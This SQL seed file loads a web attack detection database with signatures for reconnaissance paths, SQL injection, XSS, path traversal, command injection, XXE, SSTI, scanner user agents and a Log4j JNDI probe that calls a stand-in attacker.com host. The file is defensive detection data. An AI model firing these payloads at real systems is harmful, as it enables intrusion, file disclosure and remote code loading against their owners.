-- Seed common attack patterns into the database
-- This provides immediate detection capabilities for users

INSERT INTO attack_patterns (attack_signature, attack_type, attack_classification, http_method, path_pattern, response_code, times_seen, first_seen, last_seen, created_by, claude_confidence) VALUES

-- Reconnaissance and Enumeration
('/.env', 'reconnaissance', 'env_probe', 'GET', '/.env', 403, 0, datetime('now'), datetime('now'), 'seed', 0.95),
('/.env.local', 'reconnaissance', 'env_probe', 'GET', '/.env.local', 403, 0, datetime('now'), datetime('now'), 'seed', 0.95),
('/.env.prod', 'reconnaissance', 'env_probe', 'GET', '/.env.prod', 403, 0, datetime('now'), datetime('now'), 'seed', 0.95),
('/.env.production', 'reconnaissance', 'env_probe', 'GET', '/.env.production', 403, 0, datetime('now'), datetime('now'), 'seed', 0.95),
('/.git', 'reconnaissance', 'source_enumeration', 'GET', '/.git', 403, 0, datetime('now'), datetime('now'), 'seed', 0.92),
('/.git/config', 'reconnaissance', 'source_enumeration', 'GET', '/.git/config', 403, 0, datetime('now'), datetime('now'), 'seed', 0.94),
('/.gitignore', 'reconnaissance', 'source_enumeration', 'GET', '/.gitignore', 403, 0, datetime('now'), datetime('now'), 'seed', 0.90),
('/.github', 'reconnaissance', 'source_enumeration', 'GET', '/.github', 403, 0, datetime('now'), datetime('now'), 'seed', 0.88),
('/config', 'reconnaissance', 'directory_enumeration', 'GET', '/config', 403, 0, datetime('now'), datetime('now'), 'seed', 0.85),
('/admin', 'reconnaissance', 'directory_enumeration', 'GET', '/admin', 403, 0, datetime('now'), datetime('now'), 'seed', 0.88),
('/admin.php', 'reconnaissance', 'directory_enumeration', 'GET', '/admin.php', 403, 0, datetime('now'), datetime('now'), 'seed', 0.90),
('/wp-admin', 'reconnaissance', 'cms_probe', 'GET', '/wp-admin', 403, 0, datetime('now'), datetime('now'), 'seed', 0.92),
('/wp-login', 'reconnaissance', 'cms_probe', 'GET', '/wp-login', 403, 0, datetime('now'), datetime('now'), 'seed', 0.92),
('/wp-login.php', 'reconnaissance', 'cms_probe', 'GET', '/wp-login.php', 403, 0, datetime('now'), datetime('now'), 'seed', 0.93),
('/xmlrpc.php', 'reconnaissance', 'cms_probe', 'GET', '/xmlrpc.php', 403, 0, datetime('now'), datetime('now'), 'seed', 0.88),
('/backup', 'reconnaissance', 'directory_enumeration', 'GET', '/backup', 403, 0, datetime('now'), datetime('now'), 'seed', 0.85),
('/backup.zip', 'reconnaissance', 'backup_enumeration', 'GET', '/backup.zip', 403, 0, datetime('now'), datetime('now'), 'seed', 0.92),
('/api', 'reconnaissance', 'api_enumeration', 'GET', '/api', 403, 0, datetime('now'), datetime('now'), 'seed', 0.80),
('/api/v1', 'reconnaissance', 'api_enumeration', 'GET', '/api/v1', 403, 0, datetime('now'), datetime('now'), 'seed', 0.82),

-- SQL Injection Attempts
('sql_injection_basic', 'sql_injection', 'sqli_attempt', 'GET', "?id=1' OR '1'='1", 403, 0, datetime('now'), datetime('now'), 'seed', 0.96),
('sql_injection_union', 'sql_injection', 'sqli_attempt', 'GET', '?id=1 UNION SELECT', 403, 0, datetime('now'), datetime('now'), 'seed', 0.95),
('sql_injection_time_based', 'sql_injection', 'sqli_attempt', 'GET', "?id=1' AND SLEEP(5) AND '1'='1", 403, 0, datetime('now'), datetime('now'), 'seed', 0.94),
('sql_injection_blind', 'sql_injection', 'sqli_attempt', 'GET', "?id=1' AND '1'='1", 403, 0, datetime('now'), datetime('now'), 'seed', 0.92),
('sql_injection_comment', 'sql_injection', 'sqli_attempt', 'GET', "?id=1' OR 1=1 --", 403, 0, datetime('now'), datetime('now'), 'seed', 0.93),

-- Cross-Site Scripting (XSS)
('xss_script_tag', 'xss', 'xss_attempt', 'GET', '<script>alert(1)</script>', 403, 0, datetime('now'), datetime('now'), 'seed', 0.96),
('xss_img_onerror', 'xss', 'xss_attempt', 'GET', '<img src=x onerror=alert(1)>', 403, 0, datetime('now'), datetime('now'), 'seed', 0.95),
('xss_svg_onload', 'xss', 'xss_attempt', 'GET', '<svg onload=alert(1)>', 403, 0, datetime('now'), datetime('now'), 'seed', 0.94),
('xss_iframe', 'xss', 'xss_attempt', 'GET', '<iframe src=javascript:alert(1)>', 403, 0, datetime('now'), datetime('now'), 'seed', 0.93),
('xss_event_handler', 'xss', 'xss_attempt', 'GET', '" onclick="alert(1)"', 403, 0, datetime('now'), datetime('now'), 'seed', 0.91),

-- Path Traversal
('path_traversal_basic', 'path_traversal', 'lfi_attempt', 'GET', '../../../etc/passwd', 403, 0, datetime('now'), datetime('now'), 'seed', 0.96),
('path_traversal_encoded', 'path_traversal', 'lfi_attempt', 'GET', '..%2F..%2F..%2Fetc%2Fpasswd', 403, 0, datetime('now'), datetime('now'), 'seed', 0.94),
('path_traversal_double_encoded', 'path_traversal', 'lfi_attempt', 'GET', '..%252F..%252F..%252Fetc%252Fpasswd', 403, 0, datetime('now'), datetime('now'), 'seed', 0.92),
('path_traversal_windows', 'path_traversal', 'lfi_attempt', 'GET', '..\\..\\..\\windows\\system32', 403, 0, datetime('now'), datetime('now'), 'seed', 0.93),

-- Command Injection
('command_injection_basic', 'command_injection', 'rce_attempt', 'GET', '; cat /etc/passwd', 403, 0, datetime('now'), datetime('now'), 'seed', 0.95),
('command_injection_pipe', 'command_injection', 'rce_attempt', 'GET', '| whoami', 403, 0, datetime('now'), datetime('now'), 'seed', 0.93),
('command_injection_and', 'command_injection', 'rce_attempt', 'GET', '&& id', 403, 0, datetime('now'), datetime('now'), 'seed', 0.92),
('command_injection_backtick', 'command_injection', 'rce_attempt', 'GET', '`whoami`', 403, 0, datetime('now'), datetime('now'), 'seed', 0.91),

-- LDAP Injection
('ldap_injection', 'ldap_injection', 'ldapi_attempt', 'POST', '*)(uid=*', 403, 0, datetime('now'), datetime('now'), 'seed', 0.88),

-- XML External Entity (XXE)
('xxe_external_entity', 'xxe', 'xxe_attempt', 'POST', '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', 403, 0, datetime('now'), datetime('now'), 'seed', 0.94),

-- Server-Side Template Injection (SSTI)
('ssti_basic', 'ssti', 'template_injection', 'GET', '{{7*7}}', 403, 0, datetime('now'), datetime('now'), 'seed', 0.85),
('ssti_jinja', 'ssti', 'template_injection', 'GET', '{{config.items()}}', 403, 0, datetime('now'), datetime('now'), 'seed', 0.87),
('ssti_erb', 'ssti', 'template_injection', 'GET', '<%= 7*7 %>', 403, 0, datetime('now'), datetime('now'), 'seed', 0.86),

-- Brute Force Attempts (Many requests to login endpoints)
('brute_force_login', 'brute_force', 'auth_attack', 'POST', '/login', 403, 0, datetime('now'), datetime('now'), 'seed', 0.90),
('brute_force_admin', 'brute_force', 'auth_attack', 'POST', '/admin/login', 403, 0, datetime('now'), datetime('now'), 'seed', 0.89),

-- Malicious Headers
('malicious_user_agent_sqlmap', 'malicious_header', 'scanner_probe', 'GET', 'sqlmap', 403, 0, datetime('now'), datetime('now'), 'seed', 0.92),
('malicious_user_agent_nikto', 'malicious_header', 'scanner_probe', 'GET', 'nikto', 403, 0, datetime('now'), datetime('now'), 'seed', 0.91),
('malicious_user_agent_nmap', 'malicious_header', 'scanner_probe', 'GET', 'nmap', 403, 0, datetime('now'), datetime('now'), 'seed', 0.90),

-- Protocol-based Attacks
('http_smuggling', 'protocol_attack', 'smuggling_attempt', 'GET', 'Content-Length: 13', 403, 0, datetime('now'), datetime('now'), 'seed', 0.88),

-- Common Vulnerable Paths
('/phpmyadmin', 'reconnaissance', 'cms_probe', 'GET', '/phpmyadmin', 403, 0, datetime('now'), datetime('now'), 'seed', 0.92),
('/cpanel', 'reconnaissance', 'cms_probe', 'GET', '/cpanel', 403, 0, datetime('now'), datetime('now'), 'seed', 0.90),
('/plesk', 'reconnaissance', 'cms_probe', 'GET', '/plesk', 403, 0, datetime('now'), datetime('now'), 'seed', 0.89),

-- API-specific attacks
('/api/users', 'reconnaissance', 'api_enumeration', 'GET', '/api/users', 403, 0, datetime('now'), datetime('now'), 'seed', 0.80),
('/api/admin', 'reconnaissance', 'api_enumeration', 'GET', '/api/admin', 403, 0, datetime('now'), datetime('now'), 'seed', 0.81),

-- Null byte injection
('null_byte_injection', 'null_byte', 'file_access', 'GET', '%.php%00.txt', 403, 0, datetime('now'), datetime('now'), 'seed', 0.85),

-- Log4j CVE probes
('log4j_jndi_basic', 'log4j_exploit', 'cve_probe', 'GET', '${jndi:ldap://attacker.com/poc}', 403, 0, datetime('now'), datetime('now'), 'seed', 0.96);

